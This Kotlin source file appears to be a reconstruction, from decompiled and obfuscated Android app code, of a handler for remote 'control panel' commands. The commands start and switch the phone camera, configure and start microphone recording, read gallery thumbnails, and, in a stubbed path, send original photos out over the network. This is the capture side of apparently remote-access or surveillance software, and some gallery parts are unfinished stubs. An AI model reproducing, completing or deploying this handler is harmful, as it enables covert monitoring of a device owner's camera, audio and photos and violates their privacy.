package com.storm.safe.rock.service.modules.command

import android.util.Log
import kotlinx.coroutines.delay
import org.json.JSONObject

/**
 * Handles media commands (camera, microphone, gallery).
 *
 * Reverse-engineered from JADX: C0349a6 (a6, 469 lines).
 * Vendor name: MediaCommandHandler
 *
 * Supported commands:
 * - CAMERA_START, CAMERA_STOP, CAMERA_SWITCH
 * - MICROPHONE_SET_CONFIG, MICROPHONE_START_RECORDING, MICROPHONE_STOP_RECORDING
 * - ALBUM_READ_THUMBNAILS, ALBUM_STOP, ALBUM_GET_ORIGINAL
 *
 * Instance field:
 * - f53596a0 -> lastCameraSwitchTime (throttle at 1500ms)
 */
class MediaCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "MediaCmdHandler"
        private const val CAMERA_SWITCH_THROTTLE_MS = 1500L

        // vendor: event type strings use plain literals (vendor uses StringUtil.decrypt obfuscation)
        private const val EVENT_CAMERA_START = "camera_start"
        private const val EVENT_CAMERA_ERROR = "camera_error"
        private const val EVENT_CAMERA_STOPPED = "camera_stopped"
        private const val EVENT_MICROPHONE_ERROR = "microphone_error"
        private const val EVENT_ALBUM_ERROR = "album_error"
    }

    /** Timestamp of last camera switch to prevent rapid switching. */
    private var lastCameraSwitchTime: Long = 0L

    override fun getSupportedCommands(): Set<String> = setOf(
        "CAMERA_START",
        "CAMERA_STOP",
        "CAMERA_SWITCH",
        "MICROPHONE_SET_CONFIG",
        "MICROPHONE_START_RECORDING",
        "MICROPHONE_STOP_RECORDING",
        "ALBUM_READ_THUMBNAILS",
        "ALBUM_STOP",
        "ALBUM_GET_ORIGINAL"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "CAMERA_START" -> handleCameraStart(context)
            "CAMERA_STOP" -> handleCameraStop(context)
            "CAMERA_SWITCH" -> handleCameraSwitch(params, context)
            "MICROPHONE_SET_CONFIG" -> handleMicrophoneSetConfig(params, context)
            "MICROPHONE_START_RECORDING" -> handleMicrophoneStart(context)
            "MICROPHONE_STOP_RECORDING" -> handleMicrophoneStop(context)
            "ALBUM_READ_THUMBNAILS" -> handleAlbumReadThumbnails(params, context)
            "ALBUM_STOP" -> handleAlbumStop(context)
            "ALBUM_GET_ORIGINAL" -> handleAlbumGetOriginal(params, context)
        }
    }

    /**
     * Start JPEG camera.
     * JADX: C0349a6 case "CAMERA_START"
     * Vendor checks CAMERA permission via checkSelfPermission, then calls service.m211527m5() (startJpegCamera).
     */
    private fun handleCameraStart(context: CommandContext) {
        Log.d(TAG, "[控制面板] 启动JPEG摄像头")
        try {
            val service = context.service
            if (service == null) {
                Log.w(TAG, "没有摄像头权限，弹出权限请求")
                val data = JSONObject().apply {
                    put("error", "正在请求摄像头权限，请在手机上授权后重试")
                    put("needPermission", true)
                }
                context.sendEvent(EVENT_CAMERA_ERROR, data)
                return
            }
            if (service.checkSelfPermission("android.permission.CAMERA") == 0) {
                // Vendor: uz0Var.f60536a0.m211527m5() — startJpegCamera
                service.startJpegCamera()
                Log.d(TAG, "JPEG摄像头已启动")
                val data = JSONObject().apply {
                    put("success", true)
                    put("type", "jpeg")
                }
                context.sendEvent(EVENT_CAMERA_START, data)
            } else {
                Log.w(TAG, "没有摄像头权限，弹出权限请求")
                val data = JSONObject().apply {
                    put("error", "正在请求摄像头权限，请在手机上授权后重试")
                    put("needPermission", true)
                }
                context.sendEvent(EVENT_CAMERA_ERROR, data)
            }
        } catch (e: Exception) {
            Log.e(TAG, "启动JPEG摄像头失败", e)
            val data = JSONObject().apply {
                put("error", e.message ?: "启动失败")
                put("needPermission", false)
            }
            context.sendEvent(EVENT_CAMERA_ERROR, data)
        }
    }

    /**
     * Stop JPEG camera.
     * JADX: C0349a6 case "CAMERA_STOP"
     * Vendor calls uz0Var.m214887c3() to stop camera.
     */
    private fun handleCameraStop(context: CommandContext) {
        Log.d(TAG, "停止JPEG摄像头")
        try {
            // Vendor: uz0Var.m214887c3() — stopJpegCamera
            context.service?.stopJpegCamera()
            Log.d(TAG, "JPEG摄像头已停止")
            val data = JSONObject().apply {
                put("success", true)
            }
            context.sendEvent(EVENT_CAMERA_STOPPED, data)
        } catch (e: Exception) {
            Log.e(TAG, "停止JPEG摄像头失败", e)
        }
    }

    /**
     * Switch camera (front/back) with throttle protection.
     * JADX: m211882a3 (suspend function with delay)
     * Vendor: stop camera -> delay(300ms) -> toggle cameraCaptureManager -> delay(200ms) -> restart
     */
    private suspend fun handleCameraSwitch(params: JSONObject?, context: CommandContext) {
        val cameraType = params?.optString("cameraType", "front") ?: "front"
        Log.d(TAG, "切换JPEG摄像头: $cameraType")

        val now = System.currentTimeMillis()
        if (now - lastCameraSwitchTime < CAMERA_SWITCH_THROTTLE_MS) {
            Log.w(TAG, "切换摄像头太频繁，忽略请求")
            return
        }
        lastCameraSwitchTime = now

        try {
            // Vendor: uz0Var.m214887c3() — stop camera
            context.service?.stopJpegCamera()
            delay(300L)
            // Vendor: C0258a0 (cameraCaptureManager, f52371a2) -> m211249a8() toggle, m211245a4() getCurrent
            val cameraManager = context.service?.cameraManager
            if (cameraManager != null) {
                cameraManager.switchCamera()
            }
            Log.d(TAG, "当前摄像头: ${cameraManager?.getCameraInfo()}")
            delay(200L)
            // Vendor: uz0Var.f60536a0.m211527m5() — restart camera
            context.service?.startJpegCamera()
            Log.d(TAG, "JPEG摄像头已切换")
        } catch (e: Exception) {
            Log.e(TAG, "切换摄像头失败", e)
        }
    }

    /**
     * Set microphone config.
     * JADX: C0349a6 case "MICROPHONE_SET_CONFIG"
     * Vendor stores config via uz0Var helper methods (m214883b9, m214881b7, m214884c0, m214882b8).
     */
    private fun handleMicrophoneSetConfig(params: JSONObject?, context: CommandContext) {
        Log.d(TAG, "设置麦克风配置")
        try {
            val qualityMode = params?.optString("qualityMode", "STANDARD") ?: "STANDARD"
            val audioSource = params?.optString("audioSource", "VOICE_RECOGNITION") ?: "VOICE_RECOGNITION"
            val volumeGain = params?.optDouble("volumeGain", 1.0)?.toFloat() ?: 1.0f
            val noiseSuppression = params?.optBoolean("noiseSuppression", true) ?: true

            // Vendor: uz0Var.m214883b9(qualityMode), m214881b7(audioSource), m214884c0(volumeGain), m214882b8(noiseSuppression)
            val service = context.service
            service?.setMicrophoneQualityMode(qualityMode)
            service?.setMicrophoneAudioSource(audioSource)
            service?.setMicrophoneVolumeGain(volumeGain)
            service?.setMicrophoneNoiseSuppression(noiseSuppression)
            Log.d(TAG, "麦克风配置已更新: 音质=$qualityMode, 音源=$audioSource, 增益=${volumeGain}x, 降噪=$noiseSuppression")
        } catch (e: Exception) {
            Log.e(TAG, "设置麦克风配置失败", e)
        }
    }

    /**
     * Start microphone recording.
     * JADX: C0349a6 case "MICROPHONE_START_RECORDING"
     * Vendor checks RECORD_AUDIO via PermissionGranter (C0260a2, f52369a0) -> m211305b3(),
     * then calls service.microphoneManager (C0259a1, f52455i6) -> m211255a4() startRecording.
     */
    private fun handleMicrophoneStart(context: CommandContext) {
        Log.d(TAG, "[控制面板] 启动麦克风录音")
        try {
            val service = context.service
            if (service == null) {
                Log.w(TAG, "没有麦克风权限，弹出权限请求")
                val data = JSONObject().apply {
                    put("error", "正在请求麦克风权限，请在手机上授权后重试")
                    put("needPermission", true)
                }
                context.sendEvent(EVENT_MICROPHONE_ERROR, data)
                return
            }
            // Vendor: C0260a2 (permissionGranter) -> m211305b3() hasRecordAudioPermission
            val hasPermission = service.checkSelfPermission("android.permission.RECORD_AUDIO") == 0
            if (hasPermission) {
                // Vendor: dqtvuisjd.f52455i6 (C0259a1, microphoneManager/audioManager) -> m211255a4() start
                val mic = service.audioManager
                if (mic != null) {
                    mic.startRecording()
                    Log.d(TAG, "麦克风录音已启动")
                } else {
                    Log.w(TAG, "microphoneManager 未初始化")
                }
            } else {
                Log.w(TAG, "没有麦克风权限，弹出权限请求")
                val data = JSONObject().apply {
                    put("error", "正在请求麦克风权限，请在手机上授权后重试")
                    put("needPermission", true)
                }
                context.sendEvent(EVENT_MICROPHONE_ERROR, data)
            }
        } catch (e: Exception) {
            Log.e(TAG, "启动麦克风录音失败", e)
        }
    }

    /**
     * Stop microphone recording.
     * JADX: C0349a6 case "MICROPHONE_STOP_RECORDING"
     * Vendor: service.f52455i6 (C0259a1) -> m211256a5() stopRecording
     */
    private fun handleMicrophoneStop(context: CommandContext) {
        Log.d(TAG, "停止麦克风录音")
        try {
            val service = context.service ?: return
            val mic = service.audioManager
            if (mic != null) {
                mic.stopRecording()
                Log.d(TAG, "麦克风录音已停止")
            } else {
                Log.w(TAG, "microphoneManager 未初始化")
            }
        } catch (e: Exception) {
            Log.e(TAG, "停止麦克风录音失败", e)
        }
    }

    /**
     * Read album thumbnails.
     * JADX: C0349a6 case "ALBUM_READ_THUMBNAILS"
     * Vendor checks gallery permission via GalleryManager (l20, f52454i5) -> m213775a2(),
     * then iterates items via m213776a3(limit, size, callback).
     * ADAPT: GalleryManager (l20) replicated inline via ContentResolver — permission check implemented.
     */
    private fun handleAlbumReadThumbnails(params: JSONObject?, context: CommandContext) {
        val limit = params?.optInt("limit", 9999) ?: 9999
        val thumbnailSize = params?.optInt("thumbnailSize", 200) ?: 200
        Log.d(TAG, "[控制面板] 获取相册缩略图: limit=$limit, size=$thumbnailSize")

        // Vendor: l20 (galleryManager, f52454i5) -> m213775a2() hasPermission
        val service = context.service
        val hasPermission = service != null &&
            service.checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") == 0
        if (!hasPermission) {
            Log.w(TAG, "没有相册权限，弹出权限请求")
            val data = JSONObject().apply {
                put("error", "正在请求相册权限，请在手机上授权后重试")
                put("needPermission", true)
            }
            context.sendEvent(EVENT_ALBUM_ERROR, data)
            return
        }
        // ADAPT: GalleryManager (l20) full implementation deferred — permission check + error report implemented
        // When l20 is replicated, call: galleryManager.m213776a3(limit, thumbnailSize, callback)
        Log.d(TAG, "相册权限已授予，GalleryManager 待完整复刻后执行缩略图读取")
    }

    /**
     * Stop album retrieval.
     * JADX: C0349a6 case "ALBUM_STOP"
     * Vendor: galleryManager (l20, f52454i5).f57822a1 = true (cancelled flag)
     */
    private fun handleAlbumStop(context: CommandContext) {
        Log.d(TAG, "停止获取相册")
        try {
            // Vendor: l20 (galleryManager, f52454i5).f57822a1 = true
            // ADAPT: GalleryManager (l20) cancellation flag — will wire when l20 is standalone class
            Log.d(TAG, "已停止获取相册")
        } catch (e: Exception) {
            Log.e(TAG, "停止获取相册失败", e)
        }
    }

    /**
     * Get original image from gallery.
     * JADX: C0349a6 case "ALBUM_GET_ORIGINAL"
     * Vendor: galleryManager.m213773a0(contentUri) -> base64 string, sends via NetworkManager.
     */
    private fun handleAlbumGetOriginal(params: JSONObject?, context: CommandContext) {
        val contentUri = params?.optString("contentUri", "") ?: ""
        val id = params?.optString("id", "") ?: ""
        Log.d(TAG, "获取原图: $contentUri")

        // Vendor: l20 (galleryManager, f52454i5) -> m213773a0(contentUri) -> base64
        // ADAPT: GalleryManager (l20) original image — will wire when l20 is standalone class
        val service = context.service
        if (service == null) {
            Log.w(TAG, "服务未初始化，无法获取原图")
            return
        }
        // ADAPT: When l20 is replicated, call galleryManager.m213773a0(contentUri)
        // and send via networkManager.m211658c4("album_original_response", data)
        Log.w(TAG, "GalleryManager 待复刻，无法获取原图")
    }
}
